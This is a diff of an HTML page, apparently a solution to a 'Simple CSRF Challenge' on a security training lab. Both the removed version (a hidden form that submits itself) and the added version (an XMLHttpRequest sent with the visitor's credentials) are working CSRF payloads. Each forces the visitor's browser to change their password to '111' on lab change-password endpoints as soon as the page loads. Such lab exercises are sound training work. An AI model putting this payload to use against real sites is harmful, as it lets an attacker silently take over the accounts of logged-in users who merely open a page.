@@ -4,33 +4,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>Simple CSRF Challenge</title>
 </head>
 
 <body>
 
-<h1>This is CSRF attack</h1>
-  
-    <!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>CSRF test</title>
-</head>
-<body>
-  <h1>CSRF test page</h1>
+    <h1>Simple CSRF Challenge</h1>
 
-  <form id="csrfForm"
-        action="https://bacp2y67fi.voorivex-lab.online/change-password"
-        method="POST">
-    <input type="hidden" name="newPassword" value="111">
-  </form>
+    <script>
 
-  <script>
-    document.getElementById("csrfForm").submit();
-  </script>
-</body>
-</html>
+        var xhttp = new XMLHttpRequest();
+        xhttp.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                console.log('ok');
+            }
+        }
+
+        xhttp.open("POST", "https://qxwq8mpuzz.voorivex-lab.online/change-password");
+        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+        xhttp.withCredentials = true;
+        xhttp.send("newPassword=111");
+
+    </script>
 
 </body>
 
